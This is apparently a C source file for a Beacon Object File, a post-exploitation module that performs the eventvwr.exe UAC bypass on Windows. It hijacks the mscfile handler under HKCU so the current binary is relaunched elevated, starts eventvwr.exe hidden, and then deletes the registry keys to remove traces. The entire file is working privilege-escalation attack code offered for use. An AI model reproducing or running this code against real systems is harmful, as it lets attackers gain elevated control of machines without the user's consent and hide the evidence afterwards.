// bof_bypass_eventvwr.c -- UAC bypass via eventvwr.exe
//
// Technique: HKCU\Software\Classes\mscfile\shell\open\command
//   (Default) = <current exe>
//
// eventvwr.exe is auto-elevation whitelisted. On startup it opens
// mmc.exe with eventvwr.msc, which triggers the mscfile handler.
// Windows reads HKCU\Software\Classes\mscfile first and runs our binary
// at High Integrity (elevated). No DelegateExecute needed for this key.
//
// Cleanup: deletes HKCU\Software\Classes\mscfile after 1.5 seconds.

#include "bof_api.h"

DECLSPEC_IMPORT LONG  WINAPI ADVAPI32$RegCreateKeyExA(HKEY,LPCSTR,DWORD,LPSTR,DWORD,REGSAM,LPSECURITY_ATTRIBUTES,PHKEY,LPDWORD);
DECLSPEC_IMPORT LONG  WINAPI ADVAPI32$RegSetValueExA(HKEY,LPCSTR,DWORD,DWORD,const BYTE*,DWORD);
DECLSPEC_IMPORT LONG  WINAPI ADVAPI32$RegDeleteKeyA(HKEY,LPCSTR);
DECLSPEC_IMPORT LONG  WINAPI ADVAPI32$RegCloseKey(HKEY);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetModuleFileNameA(HMODULE,LPSTR,DWORD);
DECLSPEC_IMPORT UINT  WINAPI KERNEL32$GetSystemDirectoryA(LPSTR,UINT);
DECLSPEC_IMPORT BOOL  WINAPI SHELL32$ShellExecuteExA(SHELLEXECUTEINFOA*);
DECLSPEC_IMPORT BOOL  WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT void  WINAPI KERNEL32$Sleep(DWORD);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetLastError(void);

#define HKCU                    ((HKEY)(ULONG_PTR)((LONG)0x80000001))
#define KEY_ALL_ACCESS          0xF003F
#define REG_SZ                  1
#define REG_OPTION_NON_VOLATILE 0

static int bof_slen(const char* s) { int n = 0; while (s[n]) ++n; return n; }
static void bof_cat(char* dst, const char* src) {
    int n = bof_slen(dst);
    int i = 0;
    while (src[i]) dst[n + i] = src[i++];
    dst[n + i] = 0;
}

void go(char* args, int alen) {
    (void)args; (void)alen;

    char exepath[MAX_PATH];
    exepath[0] = 0;
    if (!KERNEL32$GetModuleFileNameA(NULL, exepath, MAX_PATH) || !exepath[0]) {
        BeaconPrintf(CALLBACK_ERROR, "[bypass_eventvwr] GetModuleFileNameA failed\n");
        return;
    }

    // Write HKCU\Software\Classes\mscfile\shell\open\command.
    // Note: no DelegateExecute -- mscfile handler is a direct ShellExecute path.
    HKEY hkey = NULL;
    LONG r = ADVAPI32$RegCreateKeyExA(
        HKCU, "Software\\Classes\\mscfile\\shell\\open\\command",
        0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hkey, NULL);
    if (r != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[bypass_eventvwr] RegCreateKeyEx failed (%d)\n", (int)r);
        return;
    }
    ADVAPI32$RegSetValueExA(hkey, NULL, 0, REG_SZ,
        (const BYTE*)exepath, (DWORD)(bof_slen(exepath) + 1));
    ADVAPI32$RegCloseKey(hkey);
    BeaconPrintf(CALLBACK_OUTPUT,
        "[bypass_eventvwr] registry patched, launching eventvwr.exe...\n");

    char fullpath[MAX_PATH];
    fullpath[0] = 0;
    char sysdir[MAX_PATH];
    sysdir[0] = 0;
    KERNEL32$GetSystemDirectoryA(sysdir, MAX_PATH);
    bof_cat(fullpath, sysdir);
    bof_cat(fullpath, "\\eventvwr.exe");

    SHELLEXECUTEINFOA sei;
    for (int _i = 0; _i < (int)sizeof(sei); ++_i) ((char*)&sei)[_i] = 0;
    sei.cbSize = sizeof(sei);
    sei.fMask  = 0x00000040; /* SEE_MASK_NOCLOSEPROCESS */
    sei.lpVerb = "open";
    sei.lpFile = fullpath;
    sei.nShow  = 0;          /* SW_HIDE */

    if (!SHELL32$ShellExecuteExA(&sei)) {
        BeaconPrintf(CALLBACK_ERROR, "[bypass_eventvwr] ShellExecuteExA failed (err=%u)\n",
            (unsigned)KERNEL32$GetLastError());
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[bypass_eventvwr] eventvwr.exe launched\n");
        if (sei.hProcess) KERNEL32$CloseHandle(sei.hProcess);
    }

    // Give the elevated process time to read the registry before cleanup.
    KERNEL32$Sleep(1500);
    ADVAPI32$RegDeleteKeyA(HKCU, "Software\\Classes\\mscfile\\shell\\open\\command");
    ADVAPI32$RegDeleteKeyA(HKCU, "Software\\Classes\\mscfile\\shell\\open");
    ADVAPI32$RegDeleteKeyA(HKCU, "Software\\Classes\\mscfile\\shell");
    ADVAPI32$RegDeleteKeyA(HKCU, "Software\\Classes\\mscfile");
    BeaconPrintf(CALLBACK_OUTPUT, "[bypass_eventvwr] registry cleaned\n");
}
